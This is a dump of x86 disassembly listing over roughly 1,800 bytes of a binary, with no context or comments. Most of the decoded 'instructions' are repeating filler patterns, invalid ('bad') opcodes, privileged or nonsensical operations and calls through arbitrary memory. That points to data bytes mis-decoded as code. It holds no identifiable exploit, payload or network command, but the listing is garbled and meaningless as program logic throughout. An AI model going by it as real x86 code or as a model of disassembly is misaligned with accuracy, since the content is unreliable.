  444043:	add    BYTE PTR [eax],al
  444045:	add    bh,bh
  444047:	add    BYTE PTR [eax],al
  444049:	add    bh,bh
  44404b:	add    BYTE PTR [eax],al
  44404d:	add    bh,bh
  44404f:	add    BYTE PTR [eax],al
  444051:	add    bh,bh
  444053:	add    BYTE PTR [eax],al
  444055:	add    bh,bh
  444057:	add    BYTE PTR [eax],al
  444059:	add    bh,bh
  44405b:	add    BYTE PTR [eax],al
  44405d:	add    bh,bh
  44405f:	add    BYTE PTR [eax],al
  444061:	add    bh,bh
  444063:	add    BYTE PTR [eax],al
  444065:	push   es
  444066:	inc    DWORD PTR [eax]
  444068:	add    BYTE PTR [ecx],bl
  44406a:	inc    DWORD PTR [eax]
  44406c:	add    BYTE PTR ds:0x6f0000ff,bh
  444072:	inc    DWORD PTR [eax]
  444074:	add    ah,dl
  444076:	inc    DWORD PTR [eax]
  444078:	adc    ebp,ebp
  44407a:	call   DWORD PTR [esi]
  44407c:	and    BYTE PTR [edx-0x1],ah
  44407f:	sub    al,0x1f
  444081:	sub    edi,edi
  444083:	sub    eax,0xff4d20
  444088:	add    BYTE PTR [ebx],cl
  44408a:	call   FWORD PTR [esi]
  44408c:	push   ss
  44408d:	cmp    edi,edi
  44408f:	sub    BYTE PTR [eax],ah
  444091:	cmp    edi,edi
  444093:	or     BYTE PTR [ebx],cl
  444095:	and    bh,bh
  444097:	adc    eax,0x11ff3a1b
  44409c:	adc    ebx,DWORD PTR [edi-0x1]
  44409f:	add    DWORD PTR ds:0x401ffee,eax
  4440a5:	xlat   BYTE PTR ds:[ebx]
  4440a6:	inc    DWORD PTR [eax]
  4440a8:	add    BYTE PTR [esi-0x3bfeff01],bh
  4440ae:	inc    DWORD PTR [edx]
  4440b0:	add    al,0xad
  4440b2:	dec    DWORD PTR ds:0xeff620d
  4440b8:	adc    DWORD PTR [ecx+0x5c2216ff],esi
  4440be:	call   FWORD PTR [ebx]
  4440c0:	xor    eax,0x403ffb9
  4440c5:	enter  0xff,0x0
  4440c9:	retf   
  4440ca:	inc    DWORD PTR [eax]
  4440cc:	add    al,al
  4440ce:	inc    DWORD PTR [ecx]
  4440d0:	add    al,dh
  4440d2:	inc    DWORD PTR [edi]
  4440d4:	or     ah,BYTE PTR [ebx+0x320704ff]
  4440da:	call   DWORD PTR [ebx]
  4440dc:	adc    ah,BYTE PTR ds:0x28110fff
  4440e2:	call   DWORD PTR [edx]
  4440e4:	adc    al,0x1f
  4440e6:	dec    DWORD PTR [esi]
  4440e8:	adc    BYTE PTR [edx],ah
  4440ea:	dec    DWORD PTR [ecx]
  4440ec:	adc    BYTE PTR [esi],ah
  4440ee:	dec    DWORD PTR [eax+edx*1]
  4440f1:	and    eax,0x351210ff
  4440f6:	inc    DWORD PTR [esi]
  4440f8:	or     esi,DWORD PTR [ebp+0x381d18ff]
  4440fe:	call   FWORD PTR [esi]
  444100:	sbb    al,0x29
  444102:	jmp    DWORD PTR [ecx]
  444104:	and    BYTE PTR [edx-0x1],ch
  444107:	add    BYTE PTR [eax],al
  444109:	loop   0x44410a
  44410b:	add    BYTE PTR [eax],al
  44410d:	mov    esi,0x9f0000ff
  444112:	inc    DWORD PTR [eax]
  444114:	add    BYTE PTR [ecx-0x69f4f901],cl
  44411a:	inc    DWORD PTR [ebx]
  44411c:	or     eax,0xffcb
  444121:	pop    eax
  444122:	inc    DWORD PTR [eax]
  444124:	add    BYTE PTR [esi],bh
  444126:	inc    DWORD PTR [eax]
  444128:	add    BYTE PTR [esi],ah
  44412a:	inc    DWORD PTR [eax]
  44412c:	add    BYTE PTR [edx],dl
  44412e:	inc    DWORD PTR [eax]
  444130:	add    BYTE PTR [edi+edi*8],al
  444133:	add    BYTE PTR [eax],al
  444135:	add    bh,bh
  444137:	add    BYTE PTR [eax],al
  444139:	add    bh,bh
  44413b:	add    BYTE PTR [eax],al
  44413d:	add    bh,bh
  44413f:	add    BYTE PTR [eax],al
  444141:	add    bh,bh
  444143:	add    BYTE PTR [eax],al
  444145:	add    bh,bh
  444147:	add    BYTE PTR [eax],al
  444149:	add    bh,bh
  44414b:	add    BYTE PTR [eax],al
  44414d:	add    bh,bh
  44414f:	add    BYTE PTR [eax],al
  444151:	add    bh,bh
  444153:	add    BYTE PTR [eax],al
  444155:	add    edi,edi
  444157:	add    BYTE PTR [eax],al
  444159:	pop    es
  44415a:	inc    DWORD PTR [eax]
  44415c:	add    BYTE PTR [ecx],dl
  44415e:	inc    DWORD PTR [eax]
  444160:	add    BYTE PTR [ebx],ah
  444162:	inc    DWORD PTR [eax]
  444164:	add    BYTE PTR [eax-0x1],al
  444167:	add    BYTE PTR [eax],al
  444169:	push   0x910000ff
  44416e:	inc    DWORD PTR [eax]
  444170:	add    bl,al
  444172:	inc    DWORD PTR [eax]
  444174:	add    DWORD PTR [edi-0x48f7fe01],edi
  44417a:	inc    DWORD PTR [esi]
  44417c:	adc    esp,edx
  44417e:	dec    DWORD PTR [esi]
  444180:	or     eax,0x1613ff83
  444185:	aas    
  444186:	dec    DWORD PTR [esi]
  444188:	adc    al,0x46
  44418a:	call   DWORD PTR [eax]
  44418c:	adc    al,0x43
  44418e:	dec    DWORD PTR ds:0x10ff370b
  444194:	adc    eax,DWORD PTR [esi-0x1]
  444197:	adc    DWORD PTR [edi],ecx
  444199:	jbe    0x44419a
  44419b:	adc    BYTE PTR [edi],cl
  44419d:	dec    ebx
  44419e:	call   FWORD PTR [eax]
  4441a0:	pop    ss
  4441a1:	call   DWORD PTR ss:[edi]
  4441a4:	sbb    al,0x49
  4441a6:	inc    DWORD PTR [edx+eax*1]
  4441a9:	sub    bh,bh
  4441ab:	wbinvd 
  4441ad:	das    
  4441ae:	call   DWORD PTR [esi]
  4441b0:	adc    DWORD PTR [edi+edi*8+0x7],eax
  4441b4:	pop    es
  4441b5:	or     edi,edi
  4441b7:	or     eax,0xff580c
  4441bc:	add    BYTE PTR [eax-0x40fdf901],ch
  4441c2:	call   FWORD PTR [esi]
  4441c4:	pop    ss
  4441c5:	dec    esp
  4441c6:	call   DWORD PTR ds:0x12ff3e17
  4441cc:	adc    esi,DWORD PTR [ecx]
  4441ce:	call   DWORD PTR ds:0x11ff2410
  4441d4:	push   ss
  4441d5:	inc    esp
  4441d6:	dec    DWORD PTR [ebx]
  4441d8:	sbb    edi,DWORD PTR [ecx-0x33fffe01]
  4441de:	dec    DWORD PTR [ebx]
  4441e0:	add    al,0x1d
  4441e2:	dec    DWORD PTR ds:0x15ff4618
  4441e8:	xor    ah,bl
  4441ea:	jmp    DWORD PTR [eax]
  4441ec:	sub    eax,esp
  4441ee:	jmp    DWORD PTR [ecx]
  4441f0:	and    eax,0x1a0dff7c
  4441f5:	jae    0x4441f6
  4441f7:	or     dl,BYTE PTR [edi+ebx*4]
  4441fa:	call   DWORD PTR [ecx+ebx*1]
  4441fd:	pop    esp
  4441fe:	inc    DWORD PTR ds:0x14ff881d
  444204:	and    eax,0x2c18ff74
  444209:	lods   eax,DWORD PTR ds:[esi]
  44420a:	call   FWORD PTR [edx]
  44420c:	sbb    DWORD PTR [edx-0x1],ecx
  44420f:	pop    ss
  444210:	adc    eax,0x1e1aff38
  444215:	pop    ecx
  444216:	call   DWORD PTR [eax]
  444218:	adc    DWORD PTR [edi+edi*8],edx
  44421b:	add    BYTE PTR [eax],al
  44421d:	stos   DWORD PTR es:[edi],eax
  44421e:	dec    DWORD PTR [edx]
  444220:	or     ch,BYTE PTR [edi+edi*8]
  444223:	or     bl,BYTE PTR [ecx]
  444225:	mov    ah,0xff
  444227:	add    BYTE PTR [ecx],al
  444229:	sar    edi,0x0
  44422c:	add    BYTE PTR [ecx-0x1],ch
  44422f:	add    BYTE PTR [eax],al
  444231:	inc    DWORD PTR ss:[eax]
  444234:	add    BYTE PTR ds:0x30000ff,dl
  44423a:	inc    DWORD PTR [eax]
  44423c:	add    BYTE PTR [eax],al
  44423e:	inc    DWORD PTR [eax]
  444240:	add    BYTE PTR [eax],al
  444242:	inc    DWORD PTR [eax]
  444244:	add    BYTE PTR [eax],al
  444246:	inc    DWORD PTR [eax]
  444248:	add    BYTE PTR [eax],al
  44424a:	inc    DWORD PTR [eax]
  44424c:	add    BYTE PTR [eax],al
  44424e:	inc    DWORD PTR [eax]
  444250:	add    BYTE PTR [eax],al
  444252:	inc    DWORD PTR [eax]
  444254:	add    BYTE PTR [eax],al
  444256:	inc    DWORD PTR [eax]
  444258:	add    BYTE PTR [eax],al
  44425a:	inc    DWORD PTR [eax]
  44425c:	add    BYTE PTR [eax],al
  44425e:	inc    DWORD PTR [eax]
  444260:	add    BYTE PTR [eax],al
  444262:	inc    DWORD PTR [eax]
  444264:	add    BYTE PTR [eax],cl
  444266:	inc    DWORD PTR [eax]
  444268:	add    BYTE PTR [edi],bl
  44426a:	inc    DWORD PTR [eax]
  44426c:	add    BYTE PTR [ebp-0x1],al
  44426f:	add    BYTE PTR [eax],al
  444271:	jns    0x444272
  444273:	add    BYTE PTR [eax],al
  444275:	loop   0x444276
  444277:	pop    es
  444278:	adc    al,0xb6
  44427a:	call   FWORD PTR [edx]
  44427c:	and    eax,0x1e2bff4a
  444281:	inc    edi
  444282:	jmp    DWORD PTR [esi]
  444284:	sbb    eax,0xf1aff4d
  444289:	xor    bh,bh
  44428b:	sbb    ebx,DWORD PTR [ecx]
  44428d:	inc    ebx
  44428e:	call   DWORD PTR [esp+ebx*1]
  444291:	inc    ecx
  444292:	call   DWORD PTR [ecx]
  444294:	sbb    BYTE PTR [ebx],dh
  444296:	dec    DWORD PTR [edx]
  444298:	or     eax,DWORD PTR [edi+edi*8]
  44429b:	add    DWORD PTR ds:0x101ffe1,eax
  4442a1:	fdivr  st,st(7)
  4442a3:	add    BYTE PTR [eax],al
  4442a5:	mov    esi,0xce0200ff
  4442aa:	inc    DWORD PTR [eax]
  4442ac:	add    eax,0x1012ffd5
  4442b1:	dec    ebp
  4442b2:	call   DWORD PTR [edi+edx*1]
  4442b5:	popa   
  4442b6:	call   DWORD PTR [edx]
  4442b8:	adc    ch,BYTE PTR [edi+edi*8]
  4442bb:	push   ss
  4442bc:	sbb    ecx,DWORD PTR [edi+edi*8+0x1e]
  4442c0:	and    BYTE PTR [edi],cl
  4442c2:	inc    DWORD PTR [eax]
  4442c4:	add    ch,dl
  4442c6:	inc    DWORD PTR [eax]
  4442c8:	add    dl,al
  4442ca:	inc    DWORD PTR [ebx]
  4442cc:	add    bl,bl
  4442ce:	inc    DWORD PTR [eax]
  4442d0:	add    al,bl
  4442d2:	inc    DWORD PTR [esi]
  4442d4:	adc    edx,DWORD PTR ds:0xc0103ff
  4442da:	call   DWORD PTR ds:0x13ff3a12
  4442e0:	push   ss
  4442e1:	call   DWORD PTR cs:[edx]
  4442e4:	adc    ch,BYTE PTR [edi]
  4442e6:	dec    DWORD PTR [esi]
  4442e8:	or     al,0x21
  4442ea:	dec    DWORD PTR [eax]
  4442ec:	or     ah,BYTE PTR [ecx]
  4442ee:	dec    DWORD PTR [esi]
  4442f0:	adc    DWORD PTR [esi],ebp
  4442f2:	call   DWORD PTR [esi]
  4442f4:	sbb    al,0x25
  4442f6:	dec    DWORD PTR [ecx]
  4442f8:	or     al,0x8e
  4442fa:	dec    DWORD PTR [esi]
  4442fc:	je     0x24636601
  444302:	jmp    DWORD PTR [edi]
  444304:	and    al,0x2a
  444306:	dec    DWORD PTR [ecx+edx*1]
  444309:	int3   
  44430a:	inc    DWORD PTR [eax]
  44430c:	add    ch,al
  44430e:	inc    DWORD PTR [eax]
  444310:	add    BYTE PTR [ecx+0x700000ff],dl
  444316:	inc    DWORD PTR [ecx]
  444318:	add    DWORD PTR [edx-0x1],ebx
  44431b:	add    DWORD PTR [edx],eax
  44431d:	dec    edi
  44431e:	inc    DWORD PTR [eax]
  444320:	add    BYTE PTR ds:0x250000ff,dh
  444326:	inc    DWORD PTR [eax]
  444328:	add    BYTE PTR [esi],dl
  44432a:	inc    DWORD PTR [eax]
  44432c:	add    BYTE PTR [edx],cl
  44432e:	inc    DWORD PTR [eax]
  444330:	add    BYTE PTR [edx],al
  444332:	inc    DWORD PTR [eax]
  444334:	add    BYTE PTR [eax],al
  444336:	inc    DWORD PTR [eax]
  444338:	add    BYTE PTR [eax],al
  44433a:	inc    DWORD PTR [eax]
  44433c:	add    BYTE PTR [eax],al
  44433e:	inc    DWORD PTR [eax]
  444340:	add    BYTE PTR [eax],al
  444342:	inc    DWORD PTR [eax]
  444344:	add    BYTE PTR [eax],al
  444346:	inc    DWORD PTR [eax]
  444348:	add    BYTE PTR [eax],al
  44434a:	inc    DWORD PTR [eax]
  44434c:	add    BYTE PTR [eax],al
  44434e:	inc    DWORD PTR [eax]
  444350:	add    BYTE PTR [eax],al
  444352:	inc    DWORD PTR [eax]
  444354:	add    BYTE PTR [eax],al
  444356:	inc    DWORD PTR [eax]
  444358:	add    BYTE PTR [ebx],al
  44435a:	inc    DWORD PTR [eax]
  44435c:	add    BYTE PTR [ecx],cl
  44435e:	inc    DWORD PTR [eax]
  444360:	add    BYTE PTR [edi+edi*8],dl
  444363:	add    BYTE PTR [eax],al
  444365:	sub    edi,edi
  444367:	add    BYTE PTR [eax],al
  444369:	dec    ebx
  44436a:	inc    DWORD PTR [eax]
  44436c:	add    BYTE PTR [ebp-0x1],dh
  44436f:	add    BYTE PTR ds:0x1206ffb9,al
  444375:	sar    edi,cl
  444377:	push   ss
  444378:	sbb    esi,DWORD PTR [ebx-0x1]
  44437b:	sbb    al,0x1a
  44437d:	sbb    al,0xff
  44437f:	adc    BYTE PTR [ecx],dl
  444381:	sbb    bh,bh
  444383:	push   cs
  444384:	adc    edi,DWORD PTR [ecx]
  444386:	dec    DWORD PTR [esi]
  444388:	adc    al,0x5a
  44438a:	call   FWORD PTR [eax]
  44438c:	sbb    DWORD PTR [eax-0x1],ebp
  44438f:	or     ecx,DWORD PTR [ecx]
  444391:	cmp    eax,0x200c0fff
  444396:	call   DWORD PTR [ebx+edx*1]
  444399:	cmp    bh,bh
  44439b:	or     al,0xb
  44439d:	jb     0x44439e
  44439f:	adc    DWORD PTR ds:0x1211ff56,edx
  4443a5:	inc    ebp
  4443a6:	call   DWORD PTR [esp+edx*1]
  4443a9:	xor    eax,0x3b1111ff
  4443ae:	dec    DWORD PTR [ebx]
  4443b0:	or     DWORD PTR [edi],esp
  4443b2:	dec    DWORD PTR [esi]
  4443b4:	or     bl,BYTE PTR ds:0x5c0507ff
  4443ba:	inc    DWORD PTR [eax]
  4443bc:	add    BYTE PTR [ecx-0x4ffdfb01],ch
  4443c2:	jmp    DWORD PTR [edx]
  4443c4:	sbb    al,0x54
  4443c6:	call   DWORD PTR [ebx]
  4443c8:	adc    al,0x3a
  4443ca:	call   DWORD PTR [ebx]
  4443cc:	push   ss
  4443cd:	dec    eax
  4443ce:	call   DWORD PTR [ebx]
  4443d0:	adc    eax,DWORD PTR [ebp-0x1]
  4443d3:	adc    al,0x13
  4443d5:	inc    edx
  4443d6:	call   DWORD PTR [ebx]
  4443d8:	adc    esi,DWORD PTR [esi]
  4443da:	dec    DWORD PTR ds:0x23ff190e
  4443e0:	pop    ds
  4443e1:	inc    eax
  4443e2:	jmp    FWORD PTR [edi+ebx*1]
  4443e5:	sub    edi,edi
  4443e7:	or     eax,0x11ff460e
  4443ec:	and    DWORD PTR [ebp-0x1],eax
  4443ef:	and    al,0x1d
  4443f1:	dec    ebp
  4443f2:	call   DWORD PTR [edx]
  4443f4:	and    cl,BYTE PTR [ebp-0x1]
  4443f7:	or     al,0x1d
  4443f9:	inc    edx
  4443fa:	dec    DWORD PTR [edx]
  4443fc:	adc    dh,BYTE PTR [edi+edi*8+0x15]
  444400:	and    edx,DWORD PTR [edi-0x1]
  444403:	or     dl,BYTE PTR [ebx]
  444405:	cmp    al,0xff
  444407:	adc    edx,DWORD PTR [edi]
  444409:	and    eax,0x3c2327ff
  44440e:	call   DWORD PTR [ecx]
  444410:	sbb    ah,BYTE PTR [ecx+0x45130dff]
  444416:	dec    DWORD PTR [edx]
  444418:	or     eax,0xff31
  44441d:	mov    edi,0xa100cff
  444422:	dec    DWORD PTR ds:0xffb61d
  444428:	or     esi,ebx
  44442a:	inc    DWORD PTR [eax]
  44442c:	add    BYTE PTR [esi-0x1],ch
  44442f:	add    BYTE PTR [eax],al
  444431:	cmp    edi,edi
  444433:	add    BYTE PTR [eax],al
  444435:	sbb    edi,edi
  444437:	add    BYTE PTR [eax],al
  444439:	add    eax,0xff
  44443e:	inc    DWORD PTR [eax]
  444440:	add    BYTE PTR [eax],al
  444442:	inc    DWORD PTR [eax]
  444444:	add    BYTE PTR [eax],al
  444446:	inc    DWORD PTR [eax]
  444448:	add    BYTE PTR [eax],al
  44444a:	inc    DWORD PTR [eax]
  44444c:	add    BYTE PTR [eax],al
  44444e:	inc    DWORD PTR [eax]
  444450:	add    BYTE PTR [eax],al
  444452:	inc    DWORD PTR [eax]
  444454:	add    BYTE PTR [eax],al
  444456:	inc    DWORD PTR [eax]
  444458:	add    BYTE PTR [eax],al
  44445a:	inc    DWORD PTR [eax]
  44445c:	add    BYTE PTR [eax],al
  44445e:	inc    DWORD PTR [eax]
  444460:	add    BYTE PTR [ecx],al
  444462:	inc    DWORD PTR [eax]
  444464:	add    BYTE PTR [edi+edi*8],cl
  444467:	add    BYTE PTR [eax],al
  444469:	inc    DWORD PTR es:[eax]
  44446c:	add    BYTE PTR [edi-0x1],cl
  44446f:	add    BYTE PTR [eax],al
  444471:	xchg   bh,bh
  444473:	add    cl,BYTE PTR [ecx]
  444475:	loopne 0x444476
  444477:	adc    ch,BYTE PTR [edx]
  444479:	pushf  
  44447a:	call   DWORD PTR [eax]
  44447c:	push   ds
  44447d:	dec    edi
  44447e:	jmp    DWORD PTR ds:0x1eff471c
  444484:	pop    ss
  444485:	inc    edx
  444486:	jmp    DWORD PTR [eax]
  444488:	sbb    DWORD PTR [ecx-0x1],eax
  44448b:	adc    BYTE PTR [edi],cl
  44448d:	xor    bh,bh
  44448f:	or     dl,BYTE PTR [eax]
  444491:	sub    al,0xff
  444493:	push   cs
  444494:	or     eax,0x600ff02
  444499:	mov    edi,edi
  44449b:	add    BYTE PTR [edi],al
  44449d:	out    dx,al
  44449e:	inc    DWORD PTR [eax]
  4444a0:	add    cl,al
  4444a2:	inc    DWORD PTR [ecx]
  4444a4:	pop    es
  4444a5:	(bad)  
  4444a6:	inc    DWORD PTR [eax]
  4444a8:	pop    es
  4444a9:	fdivr  st,st(7)
  4444ab:	adc    al,0x14
  4444ad:	inc    esi
  4444ae:	call   DWORD PTR [esi]
  4444b0:	adc    al,0x28
  4444b2:	call   FWORD PTR [eax]
  4444b4:	pop    ss
  4444b5:	cmp    bh,bh
  4444b7:	adc    BYTE PTR [edi],cl
  4444b9:	xor    edi,edi
  4444bb:	or     cl,BYTE PTR ds:0xd0eff19
  4444c1:	dec    esi
  4444c2:	inc    DWORD PTR [eax]
  4444c4:	add    dl,dh
  4444c6:	inc    DWORD PTR [ebx]
  4444c8:	add    eax,edx
  4444ca:	call   DWORD PTR [ebx]
  4444cc:	adc    ebp,DWORD PTR [edi-0x1]
  4444cf:	adc    DWORD PTR [ecx+eiz*2],edx
  4444d2:	inc    DWORD PTR [esi+ecx*1]
  4444d5:	and    al,0xff
  4444d7:	adc    al,0x11
  4444d9:	sub    al,0xff
  4444db:	pop    ds
  4444dc:	sbb    bh,BYTE PTR [eax]
  4444de:	dec    DWORD PTR [esi+ecx*1]
  4444e1:	and    bh,bh
  4444e3:	adc    eax,0x1cff3315
  4444e8:	push   ds
  4444e9:	xor    edi,edi
  4444eb:	sbb    ebx,DWORD PTR [edi]
  4444ed:	cmp    edi,edi
  4444ef:	or     DWORD PTR [ecx],ecx
  4444f1:	xor    edi,edi
  4444f3:	sbb    eax,0x16ff4122
  4444f8:	sbb    cl,BYTE PTR [esi-0x1]
  4444fb:	add    eax,0x24ffc506
  444500:	es xor edi,edi
  444503:	sub    DWORD PTR cs:[edx],ebp
  444506:	call   DWORD PTR [esi+edx*1]
  444509:	mov    dh,0xff
  44450b:	add    BYTE PTR [eiz*8-0x72ffff01],al
  444512:	inc    DWORD PTR [eax]
  444514:	add    BYTE PTR [ecx-0x1],ah
  444517:	add    BYTE PTR [eax],al
  444519:	inc    edx
  44451a:	inc    DWORD PTR [eax]
  44451c:	add    BYTE PTR [edi+edi*8],ch
  44451f:	add    BYTE PTR [eax],al
  444521:	sbb    eax,0x130000ff
  444526:	inc    DWORD PTR [eax]
  444528:	add    BYTE PTR [edi+edi*8],cl
  44452b:	add    BYTE PTR [eax],al
  44452d:	add    al,0xff
  44452f:	add    BYTE PTR [eax],al
  444531:	add    bh,bh
  444533:	add    BYTE PTR [eax],al
  444535:	add    bh,bh
  444537:	add    BYTE PTR [eax],al
  444539:	add    bh,bh
  44453b:	add    BYTE PTR [eax],al
  44453d:	add    bh,bh
  44453f:	add    BYTE PTR [eax],al
  444541:	add    bh,bh
  444543:	add    BYTE PTR [eax],al
  444545:	add    bh,bh
  444547:	add    BYTE PTR [eax],al
  444549:	add    bh,bh
  44454b:	add    BYTE PTR [eax],al
  44454d:	add    bh,bh
  44454f:	add    BYTE PTR [eax],al
  444551:	add    bh,bh
  444553:	add    BYTE PTR [eax],al
  444555:	add    bh,bh
  444557:	add    BYTE PTR [eax],al
  444559:	add    edi,edi
  44455b:	add    BYTE PTR [eax],al
  44455d:	add    al,0xff
  44455f:	add    BYTE PTR [eax],al
  444561:	or     bh,bh
  444563:	add    BYTE PTR [eax],al
  444565:	sbb    edi,edi
  444567:	add    BYTE PTR [eax],al
  444569:	xor    al,0xff
  44456b:	add    BYTE PTR [eax],al
  44456d:	pop    ebx
  44456e:	inc    DWORD PTR [edx]
  444570:	push   es
  444571:	fwait
  444572:	inc    DWORD PTR [ebx]
  444574:	adc    ch,cl
  444576:	jmp    DWORD PTR ds:0x20ff3323
  44457c:	sbb    al,0x34
  44457e:	dec    DWORD PTR [esi]
  444580:	adc    DWORD PTR [edi],ebp
  444582:	inc    DWORD PTR [eax+ecx*1]
  444585:	add    edi,edi
  444587:	adc    DWORD PTR [esi],edx
  444589:	sbb    al,0xff
  44458b:	sbb    ebx,DWORD PTR [edi]
  44458d:	pop    ebx
  44458e:	dec    DWORD PTR ds:0x5ff3d0c
  444594:	add    eax,0xb0affa3
  444599:	jle    0x44459a
  44459b:	adc    dl,BYTE PTR [eax]
  44459d:	sub    eax,0x900e0aff
  4445a2:	call   DWORD PTR [edx]
  4445a4:	sbb    dl,BYTE PTR [ebp-0x1]
  4445a7:	sbb    DWORD PTR [ebx],ebx
  4445a9:	dec    ecx
  4445aa:	dec    DWORD PTR [edi]
  4445ac:	adc    DWORD PTR [ecx],edi
  4445ae:	dec    DWORD PTR [ebx+ecx*1]
  4445b1:	xor    al,0xff
  4445b3:	adc    cl,BYTE PTR [esi]
  4445b5:	sub    al,0xff
  4445b7:	adc    al,0x13
  4445b9:	arpl   di,di
  4445bb:	add    BYTE PTR [eax],al
  4445bd:	mov    ds:0xb60101ff,al
  4445c2:	call   FWORD PTR [ebx]
  4445c4:	pop    ss
  4445c5:	call   FWORD PTR fs:[eax]
  4445c8:	pop    ss
  4445c9:	aaa    
  4445ca:	call   DWORD PTR [eax]
  4445cc:	adc    bh,BYTE PTR [ecx]
  4445ce:	dec    DWORD PTR [edi]
  4445d0:	adc    DWORD PTR [ebx],edi
  4445d2:	call   DWORD PTR [eax]
  4445d4:	adc    eax,DWORD PTR [edx-0x1]
  4445d7:	adc    dl,BYTE PTR [esi+eax*2]
  4445da:	call   DWORD PTR [esi]
  4445dc:	pop    ss
  4445dd:	pop    eax
  4445de:	jmp    FWORD PTR [ecx]
  4445e0:	and    al,0x6f
  4445e2:	jmp    FWORD PTR ds:0x15ff7426
  4445e8:	adc    eax,0x1409ff36
  4445ed:	inc    ecx
  4445ee:	call   DWORD PTR [edi]
  4445f0:	sbb    DWORD PTR [edx-0x1],ebx
  4445f3:	and    eax,0x18ff4e13
  4445f8:	sbb    al,BYTE PTR [edi-0x1]
  4445fb:	adc    dl,BYTE PTR [eax]
  4445fd:	daa    
  4445fe:	call   FWORD PTR [ecx]
  444600:	sbb    eax,0x190cff5a
  444605:	push   ebp
  444606:	dec    DWORD PTR [ebx]
  444608:	or     eax,0x2426ff26
  44460d:	inc    eax
  44460e:	jmp    DWORD PTR [eax]
  444610:	and    cl,BYTE PTR [edx-0x1]
  444613:	adc    bl,BYTE PTR [edx]
  444615:	cmp    eax,0x38110bff
  44461a:	inc    DWORD PTR [eax]
  44461c:	add    esp,DWORD PTR [edi+edi*8-0xfef2f2]
  444623:	or     al,0x21
  444625:	into   
  444626:	inc    DWORD PTR [eax]
  444628:	push   cs
  444629:	fdivp  st(7),st
  44462b:	add    BYTE PTR [eax],al
  44462d:	jbe    0x44462e
  44462f:	add    BYTE PTR [eax],al
  444631:	inc    edx
  444632:	inc    DWORD PTR [eax]
  444634:	add    BYTE PTR [edi+edi*8],bl
  444637:	add    BYTE PTR [eax],al
  444639:	pop    es
  44463a:	inc    DWORD PTR [eax]
  44463c:	add    BYTE PTR [eax],al
  44463e:	inc    DWORD PTR [eax]
  444640:	add    BYTE PTR [eax],al
  444642:	inc    DWORD PTR [eax]
  444644:	add    BYTE PTR [eax],al
  444646:	inc    DWORD PTR [eax]
  444648:	add    BYTE PTR [eax],al
  44464a:	inc    DWORD PTR [eax]
  44464c:	add    BYTE PTR [eax],al
  44464e:	inc    DWORD PTR [eax]
  444650:	add    BYTE PTR [eax],al
  444652:	inc    DWORD PTR [eax]
  444654:	add    BYTE PTR [eax],al
  444656:	inc    DWORD PTR [eax]
  444658:	add    BYTE PTR [eax],al
  44465a:	inc    DWORD PTR [eax]
  44465c:	add    BYTE PTR [eax],al
  44465e:	inc    DWORD PTR [eax]
  444660:	add    BYTE PTR [edi+edi*8],al
  444663:	add    BYTE PTR [eax],al
  444665:	adc    bh,bh
  444667:	add    BYTE PTR [eax],al
  444669:	xor    bh,bh
  44466b:	add    BYTE PTR [eax],al
  44466d:	pop    ebp
  44466e:	inc    DWORD PTR [eax]
  444670:	add    BYTE PTR [edx-0x24dbf801],bl
  444676:	call   FWORD PTR [eax]
  444678:	xor    BYTE PTR [esi-0x1],dh
  44467b:	or     al,0x16
  44467d:	dec    ebp
  44467e:	call   FWORD PTR [ecx]
  444680:	adc    al,BYTE PTR [eax-0x1]
  444683:	push   ds
  444684:	pop    ss
  444685:	inc    esp
  444686:	jmp    DWORD PTR [edx]
  444688:	sbb    al,0x58
  44468a:	dec    DWORD PTR [ebx]
  44468c:	or     edi,DWORD PTR [edi+edi*8]
  44468f:	or     DWORD PTR [esi],eax
  444691:	and    eax,0x9e0800ff
  444696:	inc    DWORD PTR [eax]
  444698:	or     edi,esi
  44469a:	inc    DWORD PTR [ebx]
  44469c:	pop    es
  44469d:	mov    ebp,0xa50c04ff
  4446a2:	inc    DWORD PTR [ecx]
  4446a4:	or     eax,ebx
  4446a6:	call   DWORD PTR [ecx]
  4446a8:	adc    eax,0x171aff43
  4446ad:	xor    al,0xff
  4446af:	adc    edx,DWORD PTR [ebx]
  4446b1:	cmp    bh,bh
  4446b3:	adc    eax,0x12ff4518
  4446b8:	adc    DWORD PTR [edi],ebp
  4446ba:	inc    DWORD PTR [ecx+ecx*1]
  4446bd:	or     edi,edi
  4446bf:	or     ecx,DWORD PTR ds:0x101ff7b
  4446c5:	fcos   
  4446c7:	adc    dl,BYTE PTR [ebx]
  4446c9:	(bad)  
  4446ca:	call   FWORD PTR [ebx]
  4446cc:	push   ds
  4446cd:	cmp    bh,bh
  4446cf:	adc    DWORD PTR [edi],edx
  4446d1:	inc    eax
  4446d2:	dec    DWORD PTR [esi]
  4446d4:	adc    eax,0x2028ff3f
  4446d9:	inc    ecx
  4446da:	dec    DWORD PTR [edi]
  4446dc:	push   cs
  4446dd:	xor    bh,bh
  4446df:	pop    ss
  4446e0:	adc    ebp,DWORD PTR [eax]
  4446e2:	call   FWORD PTR [eax]
  4446e4:	pop    ss
  4446e5:	das    
  4446e6:	call   DWORD PTR [esi]
  4446e8:	adc    ebp,DWORD PTR [ecx]
  4446ea:	call   FWORD PTR [ecx]
  4446ec:	sbb    ebp,DWORD PTR ds:0x2a0001ff
  4446f2:	call   FWORD PTR [edx]
  4446f4:	sbb    al,0x45
  4446f6:	call   FWORD PTR [edx]
  4446f8:	and    DWORD PTR [edx],esp
  4446fa:	dec    DWORD PTR [ecx]
  4446fc:	push   cs
  4446fd:	(bad)  
  444700:	sbb    ch,BYTE PTR [edx-0x1]
  444703:	xor    ch,BYTE PTR [ebx]
  444705:	adc    al,0xff
  444707:	and    DWORD PTR ds:0xb00ff6d,ebx
  44470d:	hlt    
  44470e:	inc    DWORD PTR [eax]
  444710:	add    DWORD PTR [ebx+0x5a0000ff],edx
  444716:	inc    DWORD PTR [eax]
  444718:	add    BYTE PTR ds:0x1c0000ff,dh
  44471e:	inc    DWORD PTR [eax]
  444720:	add    BYTE PTR [esi],cl
  444722:	inc    DWORD PTR [eax]
  444724:	add    BYTE PTR [eax],cl
  444726:	inc    DWORD PTR [eax]
  444728:	add    BYTE PTR ds:0x20000ff,al
  44472e:	inc    DWORD PTR [eax]
  444730:	add    BYTE PTR [eax],al
  444732:	inc    DWORD PTR [eax]
  444734:	add    BYTE PTR [eax],al
  444736:	inc    DWORD PTR [eax]
  444738:	add    BYTE PTR [eax],al
  44473a:	inc    DWORD PTR [eax]
  44473c:	add    BYTE PTR [eax],al
  44473e:	inc    DWORD PTR [eax]
  444740:	add    BYTE PTR [eax],al
  444742:	inc    DWORD PTR [eax]
  444744:	add    BYTE PTR [eax],al
  444746:	inc    DWORD PTR [eax]
